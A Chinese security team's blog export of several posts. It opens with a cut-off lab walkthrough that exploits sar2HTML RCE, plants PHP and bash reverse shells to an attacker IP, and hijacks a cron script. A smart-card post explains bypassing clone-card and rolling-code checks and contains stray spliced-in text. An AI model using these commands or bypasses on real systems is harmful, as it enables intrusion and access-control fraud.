–min-rate 10000 -p- 192.168.9.160 只开放了一个80端口 ‍ · UDP开放端口扫描 · ​​ sudo nmap -sU -top 10 192.168.9.160 没信息 ‍ · TCP详细信息扫描 · ​​ sudo nmap -sT -sV -sC -O -p80 192.168.9.160 -oA nmap&#x2F;detail linux+apache 其他暂时没啥信息 ‍ · vuln漏洞脚本扫描 · ​​ sudo nmap –script&#x3D;vuln -p80 192.168.9.160 -oA nmap&#x2F;vuln 两个文件：/robots.txt和phpinfo.php ‍ PART.03 Getshell · 80——简单浏览 · 界面竟然是这个？！ 所以是一个刚建站的网站。 ‍ /robots.txt： /sar2HTML： It will create the report with name sar2html-hostname-date.tar.gz under &#x2F;tmpdirectory. Click “NEW”button, browse and select the report, click”Upload report”buttonto upload the data. 耶，有个文件上传点诶。 ‍ 继续读，感觉利用有点困难。 福至心灵，用searchsploit搜了一下sar2HTML，猜猜我看到了什么！ version3.2.1，绝配！ ‍ · 80——RCE · 两个都下下来看看 ​​ searchsploit-m47204​ searchsploit-m49344 利用 方法：http://&lt;ipaddr&gt;/index.php?plot=;&lt;command-here&gt; **回显： “**os”处会被替换为执行的命令，”Select Host”展开后会发现执行结果 eg： ‍ 尝试直接bash反弹shell失败，发现&amp;符号被过滤了还是啥情况。 ‍ 尝试使用49344.py现成的利用 利用时发现了一个很搞笑的问题：因为注释在前面，因此#!/usr/bin/env python实际上并不是第一行，会导致运行错误。 不过还是有报错，懒了。回去吧（) ‍ ls -liah： 尝试在 index.php 中加入php的一句话反弹shell ​​ echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguOS4xNTAiLDEyMzQ1KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc&#x3D; | base64-d &gt;&gt;index.php 啊？ ‍ 尝试了wget远程下载shell，发现不能附加执行权限，导致下载shell也没用。 尝试wget远程下载php ‍ test.txt：&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.9.150/1234 0&gt;&amp;1&#39;&quot;);?&gt; 靶机下载：wget http://192.168.9.150/test.txt -O test.php kali开启监听：nc -lvnp 1234 然后访问对应地址：http://192.168.9.160/sar2HTML/test.php ‍ PART.04 提权 · 基础信息 · ‍ · 自动任务提权 · 第一反应是自动任务提权 （回忆提示：网页上有出现自动任务） ‍ 看一下自动任务： ​​ cat &#x2F;etc&#x2F;crontab 每五分钟执行以下/var/www/html/finally.sh ‍ 可惜没有写的权限。 看眼内容： 诶哦？！我们有write.sh的所有权限啊。 看眼： ‍ 接下来直接篡改，桀桀：bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.9.150/12345 0&gt;&amp;1&#39; （我中途输错了，然后这靶机vi只能盲操作。所以我操作修改的时候不太精准，导致我倒数第二行即touch所在行变异。但是不影响，不要在意qaq） 然后在本机上开启监听，静静等待—— 成功！ （可以通过/tmp/gateway创建与否来判断./finally.sh是否执行） ‍ 拿下！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"白玉京"},{"title":"DataCon2024大数据安全分析竞赛告捷！","slug":"DataCon2024","date":"2024-11-30T16:00:00.000Z","updated":"2025-07-15T14:22:59.496Z","comments":true,"path":"2024/12/01/DataCon2024/","permalink":"http://example.com/2024/12/01/DataCon2024/","excerpt":"","text":"发布时间: DataCon2024大数据 安全分析竞赛 团队在三个不同赛道分别斩获冠军，季军，亚军 2024年11月22日，DataCon2024大数据安全分析竞赛线上赛圆满落幕。 最终，团队在AI安全赛道斩获季军，漏洞分析赛道斩获亚军，软件供应链安全赛道斩获冠军！！ 注：以下奉上本次大赛获奖名单，来自DataCon2024大数据安全分析竞赛官方公众号 AI安全赛道 软件供应链安全赛道 漏洞分析赛道 团队往期直播视频 【SecureNexusLab的个人空间-哔哩哔哩】 https://b23.tv/W7CWKjp![](/images/DataCon2024大数据安全分析竞赛告捷！/1752587174766.png) 团队也会不定期招收新成员，可以关注公众号或者QQ社群哦！ 最后，希望大家可以在新的安全领域，斩获属于自己的成绩！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"simpread-OpenVPN小白篇 | 私人知识库","slug":"simpread-OpenVPN","date":"2024-11-19T16:00:00.000Z","updated":"2025-07-15T14:29:19.256Z","comments":true,"path":"2024/11/20/simpread-OpenVPN/","permalink":"http://example.com/2024/11/20/simpread-OpenVPN/","excerpt":"","text":"发布时间: ¶ Docker部署OpenVPN实现访问内网 官方制作的Docker镜像支持X86和arm64带有UI操作但是只有英文界面本教程不提供Docker安装过程 ¶ 1. Docker加速建docker文件夹如果有则跳过。 ​​ sudo mkdir -p &#x2F;etc&#x2F;docker 创建daemon.json文件并写入配置（使用nano或者vim都可以）。 ​​ sudo nano &#x2F;etc&#x2F;docker&#x2F;daemon.json 输入以下内容，里面的加速地址可以按照格式修改，网上有很多,修改完成后按Ctrl+O，选择Y保存。 ​​ {​ “registry-mirrors”: [​ “https://dockerpull.com“,​ “https://docker.udayun.com“,​ “https://dockerproxy.cn“,​ “https://docker.rainbond.cc“,​ “https://docker.211678.top“​ ]​ } 执行命令让配置生效。 ​​ sudo systemctl daemon-reload​ sudo systemctl restart docker ¶ 2. 创建容器并启动​​ #拉取镜像​ docker pull openvpn&#x2F;openvpn-as​ #完整端口映射​ docker run -d –name&#x3D;openvpn-as –restart always –cap-add&#x3D;NET_ADMIN -p 943:943 -p 443:443 -p 1194:1194&#x2F;udp -v path:&#x2F;openvpn openvpn&#x2F;openvpn-as​ #其实只需要映射一个就可以443走tcp或者1194走UDP，考虑稳定选择443，自行选择。​ docker run -d –name&#x3D;openvpn-as –restart always –cap-add&#x3D;NET_ADMIN -p 443:443 -v path:&#x2F;openvpn openvpn&#x2F;openvpn-as 参数解释。 ​​ -d 后台运行​ –name&#x3D;openvpn-as 将容器命名为“openvpn-as”可自行修改​ –restart always 让容器跟随docker进程自启动​ –cap-add&#x3D;NET_ADMIN 让容器拥有网络管理权限​ -p 将容器的端口映射到宿主机的端口，冒号左边为宿主机端口可根据情况修改，冒号右边为容器内部端口不能更改​ -v 映射容器中的目录到宿主机目录，冒号左边为宿主机目录可根据情况修改，冒号右边为容器目录不能更改openvpn&#x2F;openvpn-as 结束的内容为你要指定哪一个镜像来启动容器 ¶ 3. 配置服务端等待两分钟在日志中找初始密码。 ​​ docker logs openvpn-as | grep “pass” ![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166002.png)访问https:&#x2F;&#x2F;宿主机IP+你将容器内部的443端口映射到宿主机的端口，因为我这里映射的是“443:443”所有访问https:&#x2F;&#x2F;宿主机IP即可，如果你映射的不是宿主机的443请在ip后加上“:你的端口”访问。一定要用https访问。输入用户名为openvpn密码则为我们从日志中获取到的初始密码。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166132.png) ​​ 登录后修改密码。 ![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166215.png)![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166386.png)在地址后面加admin路径并访问，输入用户名openvpn密码为我们修改之后的密码。由于是在docker里面运行我们需要他能访问宿主机网段的设备就需要配置一个路由，登录后找到vpn设置，如下图1标处,按照个人网段书写，不要删除原来的配置还要记得换行。通常我们不需要客户端的互联网流量走vpn因为我们只需要能访问局域网设备即可，所以关闭下图中2标的选项（默认是开启的）能有效增加流畅度，根据个人所需修改。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166453.png)往下翻点击“Save Settings”按钮保存设置，然后顶部会出现“Update Running Server”按钮，点击更新重启服务生效。到这里服务端就已经配置完成了现在我们理一下思路，我们将容器中的443端口映射到了宿主机的443端口，那么需要把宿主机的443端口走tcp协议映射到公网就行。至于用什么方案穿透大家各自发挥我用的是cpolar，因为我只是在外面写写文档没有大量数据传输需求。 ¶ 4. 客户端配置这个服务端已经提供了各个平台的安装包不需要再去找，访问https:&#x2F;&#x2F;宿主机IP，有端口加端口，登录后就能看到下载。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166582.png)但是这里下载的软件安装后默认配置还是连接的docker容器的地址，所以我们需要新创建一个配置，以windows为例。首先下载一个配置文件，notpad++打开配置文件使用替换功能将原有的IP地址全部替换为公网IP或者域名，同样的方式将所有443端口替换为公网的端口并保存。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166639.png)![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166865.png)打开客户端新增配置选择文件导入。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587166960.png)![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587167173.png)输入用户名，勾选保存密码输入服务端的密码。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587167229.png)点击CONNECT保存，会有一个弹窗点OK就可以了，然后就能看到我们的新配置，点击按钮启用连接就可以了。![](&#x2F;images&#x2F;simpread-OpenVPN小白篇 私人知识库&#x2F;1752587167347.png)现在你可以尝试ping你的内网设备能ping通就没有问题啦。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"胖大海"},{"title":"SecNL团队常态化招新提示","slug":"SecNL团队常态化招新提示","date":"2024-11-14T16:00:00.000Z","updated":"2025-07-15T14:33:19.258Z","comments":true,"path":"2024/11/15/SecNL团队常态化招新提示/","permalink":"http://example.com/2024/11/15/SecNL%E5%9B%A2%E9%98%9F%E5%B8%B8%E6%80%81%E5%8C%96%E6%8B%9B%E6%96%B0%E6%8F%90%E7%A4%BA/","excerpt":"","text":"团队发展目标 - 开源项目 ：发起并维护具有前瞻性的开源项目，鼓励团队成员贡献代码，解决实际问题，并且孵化有价值的idea。 - 研究探索 ：进行有意义的研究，特别是在网络安全、人工智能&#x2F;LLM和具身智能领域。 - 企业合作与国家课题 ：参与知名企业合作&#x2F;高校研究课题与项目，将理论研究转化为实际应用，获得实际的科研经历、实习经历等。 - 竞技与学习 ：积极参与CTF（Capture The Flag）等网络安全竞赛和其他技术竞赛，以提高团队的实战能力和团队合作精神。 - 知识分享 ：定期组织学习分享会，邀请行业专家和学术先锋，以及来自社群内部的分享，促进知识的传播和技能的提升。 - 积极的内部交流和思维碰撞 ：提供活跃的交流讨论环境和思维碰撞阵地，相互答疑和促进。 团队优势简介 目前，我们的核心成员主要包括来自北京大学、哈工深、中国科学院软件研究所等十几所高校的本硕博学生，以及腾讯、深信服等大厂师傅，和在车联网安全、数据安全等领域深耕的师傅，同时还有科研院所、高校教师等一同参与。 团队内部建立了Web安全、二进制安全、漏洞PoC库等多个知识库，囊括从Web安全的基础原理，到SRC实战的记录，以及漏洞的详细分析复现笔记，还有团队内部的资源和资料的分享。团队的师傅们在安全研究、漏洞挖掘、大语言模型等领域经验丰富，实战经历丰富，申请CNVD编号127个，cve编号163个 ，国家级&#x2F;省级计算机&#x2F;安全类赛事奖项三十余项。团队成员享有优先推荐的护网，经历蓝方25人次，红方16人次 。 团队成员中一流以上高校和研究生占比，达百分之七十以上，可以在团队内部提供不错的资源互推，包括中科院，北大等优秀的科研、工作岗位。 同时我们拥有团队内部的知识库，网站论坛（搭建中），团队的课程（与看雪平台合作，制作中），优质的项目来源等。 NEWS TODAY 针对团队成员各种贡献记录在册 针 对团队内部贡献值可以兑换不同奖品激励哦！ 部分团队公开资料 B站部分分享视频资料： [SecureNexusLab的个人空间-SecureNexusLab个人主页-哔哩哔哩视频 (bilibili.com)] (https://space.bilibili.co/3493268132203156)GitHub部分分享视频配套资料：[SecureNexusLab&#x2F;PublicMaterialSharing (github.com)] (https://github.com/SecureNexusLab/PublicMaterialSharing)物联网安全研究小组配套教程和培训： [SecureNexusLab&#x2F;IoT-fstm: 物联网设备安全测试指南 (github.com)] (https://github.com/SecureNexusLab/IoT-fstm) 提交报名 我们欢迎来自不同背景的师傅加入我们，一起打造一个活跃的交流社群，在SNL社群没有背景、能力的差异，我们欢迎大家一起学习进步。 目前社群特别关注物联网安全、大语言模型安全等领域，欢迎对相关领域感兴趣的师傅一起交流讨论。 报名流程 一、填报志愿与上传简历 投递渠道为团队邮箱：&#x73;&#x65;&#x63;&#117;&#114;&#x65;&#x6e;&#101;&#120;&#117;&#x73;&#x6c;&#97;&#x62;&#x40;&#103;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d; 投递简历主要包含两个方面内容 1、个人方向以及意向发展方向 2、与日常投递简历相同的内容即可 合并为一个PDF发送团队邮箱。 简历投递命名可以标注一下感兴趣的方向（可多列） 二、面试安排 每个月固定十五号对上个月投递的简历进行筛选，一周内进行面试通知。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"首推资源篇：ATT&CK Sync","slug":"ATTCK-Sync","date":"2024-11-02T16:00:00.000Z","updated":"2025-07-15T14:01:51.163Z","comments":true,"path":"2024/11/03/ATTCK-Sync/","permalink":"http://example.com/2024/11/03/ATTCK-Sync/","excerpt":"","text":"简介许多组织和网络防御者，包括威胁知情防御中心，都构建了某种程度上依赖于 MITRE ATT&amp;CK® 的项目。一些项目将安全控制框架映射到 ATT&amp;CK技术，而其他项目则使用 ATT&amp;CK 数据进行搜索和显示。这些项目通常依赖于 ATT&amp;CK 的特定版本 – 通常是项目开发时 ATT&amp;CK 的最新版本。 ATT&amp;CK 团队每半年发布一次版本，随着新版本的 ATT&amp;CK 发布，这些项目就会落后并过时。ATT&amp;CK 团队发布了发行说明和用于比较两个版本ATT&amp;CK 的脚本，这对于使用 ATT&amp;CK 升级是一个有帮助的开端，但也为进一步提高效率留下了一些空间。 科学与技术 ![](&#x2F;images&#x2F;首推资源篇：ATT&amp;CK Sync&#x2F;1752587151096.png) ATT&amp;CK Sync 项目旨在解决这些挑战，以便更有效地执行 ATT&amp;CK 版本升级过程。ATT&amp;CK Sync项目提供了工具和方法，组织可以使用这些工具和方法保持 ATT&amp;CK 的最新版本，从而节省时间和精力。通过及时了解 ATT&amp;CK版本，世界各地的组织可以及时了解威胁并采取与新出现的威胁相关的防御措施。 项目地址： * https://center-for-threat-informed-defense.github.io/attack-sync/","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"智能卡安全概览","slug":"smart-card-security","date":"2024-11-02T16:00:00.000Z","updated":"2025-07-15T14:07:18.332Z","comments":true,"path":"2024/11/03/smart-card-security/","permalink":"http://example.com/2024/11/03/smart-card-security/","excerpt":"","text":"安全养生智能卡是一种通过内嵌芯片实现的携带个体信息的身份识别卡。IOT安全研究中智能门锁、智能汽车等都会涉及智能卡。 各频率的加密情况和市场占有率如图 从读取机制上，智能卡分为接触式和非接触式。接触式智能卡如银行卡，通常芯片暴露在表面；非接触式智能卡内置芯片和通信线圈，没有裸露部分。在应用上，非接触式智能卡更加广泛，外形有卡贴、首 饰、薄卡、钥匙卡等。 从通讯频率上，智能卡分为125KHz低频(LF)、13.56MHz高频(HF)、868MHz-915Mhz超高频(UHF)，低频卡又称ID卡，高频卡又称IC卡。频率越高，波长越小，能携带的信息越多，传输距离越远。 ID卡：频率有125KHz、250KHz、375KHz、500KHz，多为125KHz；只存储卡号；芯片出产后卡号不可修改；卡片类ID卡多为圆线圈；和IC卡相比线圈大芯片小 IC卡：频率有13.56MHz、868MHz，多为13.56MHz；存储卡号及其它数据；可由授权用户反复擦写；卡片类IC卡多为方线圈；和ID卡相比线圈小芯片大 智能非接触式智能卡是RFID技术的一种应用，各个频带的非接触式智能卡都属于RFID卡。RFID技术中各个频率的应用如下: RFIDRFID，全称Radio FrequencyIdentification(射频识别)，是由雷达技术衍生出的一种无线通信技术。RFID系统包括读写器(Reader)、标签(Tag)和数据管理系统三个部分，标签中存储ID和个体信息，读写器读写其中内容进行识别，并与数据管理系统交互进行数据管理和处理。读写器和标签间采用各个频率的无线电波进行通信。 NFCNFC，全称Near-fieldcommunication(近场通信)，是一套短距高频无线通信的标准。NFC由RFID演变而来，同样使用无线电波进行通信，但是仅在13.56MHz工作，通信距离一般在10cm以内。 NFC兼容了RFID，NFC设备能够模拟为IC卡被读卡器识别。除此之外，NFC还能作为非接触读卡器读取别的标签，两个NFC设备之间能够实现点对点通信。 二者最显著的不同在于： RFID在各个频率都有应用，而NFC只工作在13.56MHz。 RFID中只能由读取器单向对标签进行读写，而NFC中设备能够相互读写。 NFC在13.56MHz兼容RFID，因此带有NFC芯片的设备也能识别13.56MHz的IC卡。 还有一种专门为NFC标准定制的卡称为NTAG卡，该类卡能被所有NFC设备读取，但是无法被无NFC功能的RFID读卡器识别 IC分类及复制卡检测机制 ID卡仅存储ID且不加密，价格低廉，没有安全性可言，因此破解方面主要讨论IC卡。 ISO&#x2F;IEC 14443 A&#x2F;B国际标准化组织（ISO）和国际电子技术委员会（IEC）制定了非接触式IC卡的国际标准——ISO&#x2F;IEC14443。 该标准规定射频IC卡分为Type A和Type B两种卡型。Type A卡比Type B卡更常见，但是Type B卡通信抗 干扰能力和安全性更强。目前的二代身份证，社保卡，护照等都是Type B卡，平时的饭卡、门禁卡、水 卡、一卡通等大多是Type A卡。 Mifare卡MIFARE是恩智浦半导体(NXP Semiconductors)拥有的商标之一，是一个全球化的非接触式智能卡巨头。MIFARE包括一系列依循ISO&#x2F;IEC14443-A规格，利用无线射频识别（频率为13.56MHz）的多种非接触式智能卡专有解决方案 M1卡是使用M1芯片封装的逻辑加密IC卡。M1芯片全称NXP Mifare1系列，常用的有S50(容量1K)及S70(容量4K)两种型号。 M1简介M1卡是世界上使用量最大的非接触式IC卡。从M1卡进入中国市场开始，在复制和防复制的对抗过程中演变出了各种各样的检测机制和各类沿用M1数据结构的复制卡。 目前针对IC卡破解的对抗手段有扇区加密、防火墙、滚动码和服务器数据校验等，还有直接脱离逻辑加密IC卡范畴的CPU卡，通过内置微机使其能够实现更复杂的保护机制。目前市场上逻辑加密IC卡仍是主流，但CPU卡破解难度最高，是以后的趋势，恩智浦也推出了CPU卡产品 Mifare Plus。 防火墙绕过M1卡将存储空间划分为多个扇区，又将每个扇区划分为多个区块，都从0开始编号。标准M1卡的第0个扇区的第0个区块存放了卡号(UID)、卡号校验位(BCC)、芯片类型(SAK)、应答类别(ATQA)和生产厂商信息，厂商读卡时对这些信息进行校验。0区块不可修改，其它扇区验证后可反复修改。通过修改0区块，就能复制和伪造M1卡。 UID复制卡：可以通过后门指令重复擦写所有扇区。 读卡系统通过检测卡片对后门指令的回应识别UID卡，因此UID卡几乎无法绕过任何防火墙。 CUID复制卡：可以经过常规密码验证后使用普通指令擦写0区块，绕过了对UID卡的检测。 读卡系统通过尝试擦写0区块识别CUID卡，可擦写是复制卡，不可擦写是正常卡。CUID卡可以绕过部分防火墙。 此外，由于CUID卡擦写需要经过密码验证，写错数据有可能破坏验证信息变成废卡，无法再修复。 FUID复制卡：只能修改一次0区块，通过修改一次后锁0区块绕过了对CUID卡的检测。 读卡系统很难识别FUID卡，锁卡后FUID卡就是标准M1卡。FUID卡可以绕过大部分防火墙。 UFUID复制卡：UID卡和FUID卡的结合体，可以手动控制是否锁定，不锁定就是UID卡，锁定后就是标准M1卡，锁定后无法再解锁。同样可以绕过大部分防火墙。 滚动码绕过滚动码原理：厂商在卡片中增加数据标识，每次刷卡数据标识发生变化，比如刚开始是0，刷一次变成团是素质教育的第二课堂。学校社团可分为综合社团和专业社团。综合性社团是素质教育的第二课堂。 1，再刷一次变成2，0-9不断循环。 GTU&#x2F;GUID&#x2F;GID&#x2F;GPU卡：这些卡是同一种卡，统称GTU卡。GTU卡通过修改扇区的控制字节将保存滚动码的数据块设置为只读，使读卡器更新滚动码失败。 针对部分存在漏洞的滚动码系统，可以使用GTU卡绕过： 漏洞1： 读卡器中没有新办卡的滚动码记录，无法校验滚动码的初始值。因此读卡器读到卡的滚动码为初始值时不会进行校验，默认识别为正常卡(新卡或复位卡)。使用GTU卡复制一张新办卡或复位卡即可利用该漏洞绕过滚动码检测。 漏洞2： 读卡的流程是，读卡器向卡中写入更新后的滚动码，再将卡中的新滚动码读入读卡器，下次刷卡时，检查滚动码与读卡器中保存的是否相同，不相同则判定为非法的复制卡。如果更新时写卡失败，有的读卡器不保存更新后的滚动码，有的读卡器保存卡中未更新的滚动码，这两种情况都导致刷卡完成后滚动码不更新，存在漏洞。使用GTU卡或者手动修改控制字节让卡的滚动码更新时写卡失败，就能绕过滚动码检测。 To Mom . 针对上述漏洞，有对应的防御手段： 防御漏洞1 ： 有的系统不需要初始值来判断是否的第一次刷卡，自身存储内没有刷卡记录，则认为是首次刷卡。复位值也不一定存在，有的系统没有设计复位功能。 防御漏洞2 ： 一旦写卡失败直接终止刷卡流程或者将新滚动码先保存在临时变量再存入读卡器内存，而非从卡片中读取新滚动码。 滚动码暗桩：添加数据位以增加系统的复杂程度，例如新增一处数据用于标识滚动码的循环次数。 因此针对滚动码防护，GTU卡作用有限，最优解是破解系统发卡流程实现自主发卡。 内置微机防复制 CPU卡： 卡内集成电路中包括中央处理器（CPU）、只读存储器（ROM）、随机存取存储器(RAM)、电可擦除可编程只读存储器（EEPROM）以及片内操作系统（COS）等主要部分，比普通IC卡多了CPU和COS，相当于一台微型电脑。CPU卡容量大、能执行指令，可以实现复杂的加密，目前没有公开的破解手段。 CPU模拟卡: 部分CPU卡，部分M1卡，如复旦FM1208(7k CPU + 1K M1)。目前公开资料中只能破解其M1卡部分。 SAK值为28的大部分是CPU模拟卡，少部分是CPU卡；SAK值为20大部分是CPU卡，小部分是国产CPU模拟卡。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"0P1N"},{"title":"字节ByteAI安全挑战赛——完赛告捷！","slug":"byteai","date":"2024-10-28T16:00:00.000Z","updated":"2025-07-15T13:59:51.623Z","comments":true,"path":"2024/10/29/byteai/","permalink":"http://example.com/2024/10/29/byteai/","excerpt":"","text":"团队比赛总结 CTF TRAVEL: 团队在参与了本次ByteAI安全挑战赛，在初赛中，从三百多支战队中，成功的晋级了前十名！ 随后在线下进行决赛，最后斩获第八！！！ 2 这次比赛中，团队也有很多初入赛道的新师傅一起，在学习中比赛，得到了极大的提高。 01 同时针对AI方面的测试，团队也会准备LLM安全的专题分享，时间为本周六晚，11月2号，具体参与时间与方式大家可以加入我们的QQ群获取实时通知。安全学习colab-3群：701604947 安全学习colab-4群：701934709 大语言模型攻击手册 大语言模型prompt安全 Prompt 注入攻击是伴随 LLM 技术发展所产生的新问题，被 OWASP 列为大语言模型应用漏洞 TOP 10之首，意为通过设计过的输入操纵大语言模型，引发 LLM 做出预期之外的未授权行为。由于 LLM集成应用模糊了数据和指令之间的界限，攻击者可以通过直接注入或间接注入，指示 LLM 返回敏感数据，操纵 LLM 的输出或是触发其他未授权的操作。 《大语言模型Prompt攻击手册》 由SecureNexusLab大语言模型（LLM）团队编写，基于广泛的文献研究、测试平台构建及开源模型测试等一系列工作，系统化地总结了针对 LLM的攻击技术。您可以通过以下链接获取完整的《大语言模型提示攻击手册》PDF文件，欢迎star和关注~ https://github.com/SecureNexusLab/LLMPromptAttackGuide.git 团队往期直播视频 【SecureNexusLab的个人空间-哔哩哔哩】 https://b23.tv/W7CWKjp 团队也会不定期招收新成员，可以关注公众号或者QQ社群哦！ 最后，希望大家可以在新的安全领域，斩获属于自己的成绩！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"SecureNexusLab"},{"title":"团队首个系列课程开班！系统0day安全-IOT设备漏洞挖掘","slug":"0day-IOT-lesson","date":"2024-10-20T16:00:00.000Z","updated":"2025-07-15T14:13:11.377Z","comments":true,"path":"2024/10/21/0day-IOT-lesson/","permalink":"http://example.com/2024/10/21/0day-IOT-lesson/","excerpt":"","text":"发布时间: 引言： “团队与看雪合作第一篇系列教学课程正式上线啦！” 注：以下文章来自看雪平台。 数字化时代，物联网(IoT)设备已经渗透到我们生活的方方面面，从智能家居到工业自动化，无一不依赖于这些智能设备。然而，随着IoT设备的普及，安全问题也日益凸显。IoT设备漏洞挖掘成为了保障网络安全的重要一环。 入门到精通 成为IoT漏洞挖掘专家 🔍 顶尖讲师团队【SecureNexusLab** 】，实战经验分享** 讲师团队【SecureNexusLab** 】**来自TOP2院校、中科院软件所等多个高校和研究所，他们不仅在学术界有着深厚的背景，更在实战中积累了丰富的经验。提交了数百个原创通用漏洞，在漏洞挖掘、二进制安全领域有着丰富的实践经验，在Datacon、ByteAI 等竞赛中表现优异。 🛠️ 系统性课程设计，实战技能全面提升 本课程从基础出发，涵盖固件获取、解包、仿真，再到漏洞分析与利用，为你打造一条完整的学习路径。我们不仅讲解理论知识，更注重实战操作，让你在动手中掌握IoT漏洞挖掘的核心技能。 🔧 动手实践，从0到1的跨越 这门课程强调动手操作，除了丰富的理论知识外，我们还提供配套的相关资料、课后习题、直播答疑和学习交流群。在这里，你将学会如何快速上手实践，实现从理论到实践的无缝对接。 🎯 适合人群，精准定位 如果你已经具备一定的Web安全基础，并希望系统学习IoT漏洞挖掘，或者你是一名寻求自我突破的安全从业者，这门课程将是你的理想选择。 🌟 课程收获与亮点 - 完善的课程体系：从基础准备到漏洞分析与利用，全方位覆盖IoT安全领域。 - 真实的漏洞实操：结合真实案例，完整展示漏洞复现过程，分享挖掘思路。 - 丰富的配套服务：拓展资料、直播答疑、课后习题、实战挖掘，全方位支持你的学习。 **** 课程目录**** 一、基础准备 1.1 汇编基础 1.1.1 x86 汇编 X86 汇编实践 1.1.2 ARM 汇编基础 1.1.3 MIPS 汇编基础 1.2 环境配置 1.2.1 IoT 虚拟机安装及使用 IoT 虚拟机实践 1.2.2 OWASP IoT Goat 1.3 工具介绍和使用 1.3.1 IDA Pro 介绍与使用 1.3.2 Ghidra 介绍与使用 1.3.3 GDB 介绍与使用 1.3.4 binwalk 介绍与使用 1.4 物联网常用协议及攻击方法 1.4.1 物联网常见协议及实际应用之coap协议 1.4.2 物联网常见协议及实际应用之MQTT协议 1.4.2 物联网攻击协议的攻击方法 二、固件获取与分析 2.1 固件获取 2.1.1 busybox集成环境使用 2.1.2 网络获取固件数据包 2.1.3 非常规固件获取 2.2 固件解密 2.2.1 判断固件加密方式 2.2.2 过渡版本固件逆向解密 2.2.3 硬件提取未加密的固件或密钥 2.3 固件分析 2.3.1 固件解包 2.3.2 固件解包之OOB数据去除 2.3.2 Linux固件 2.3.3 RTOS固件 2.3.4 单片机&#x2F;裸机固件固件分析 2.3.5 物联网设备调试接口概述 2.3.6 固件自动化分析工具 三、固件仿真 3.1 Qemu 的介绍与安装 3.1.1 Qemu 的介绍与安装 3.2 Qemu 用户模式仿真 3.2.1 用户模式仿真(Qemu-user)介绍 3.2.2 用户模式仿真(Qemu-user)实例演示 3.3 Qemu 系统模式仿真 3.3.1 系统模式仿真(Qemu-system)介绍 3.3.2 系统模式仿真(Qemu-system)实例演示 3.4 Qemu+GDB&#x2F;IDA调试Linux用户态程序 3.4.1 Qemu+GDB&#x2F;IDA 调试 Linux 用户态程序 3.4.2 常用固件程序执行环境修补方法 3.5 自动化仿真工具的介绍与使用 3.5.1 自动化仿真工具 FAT 的介绍与使用 3.5.2 自动化仿真工具 FirmAE 的介绍与使用 四、漏洞分析与利用 4.1 常见 IoT 漏洞类型及原理 4.1.1 常见 IoT 漏洞类型介绍 4.1.2 漏洞原理之栈溢出漏洞 4.1.3 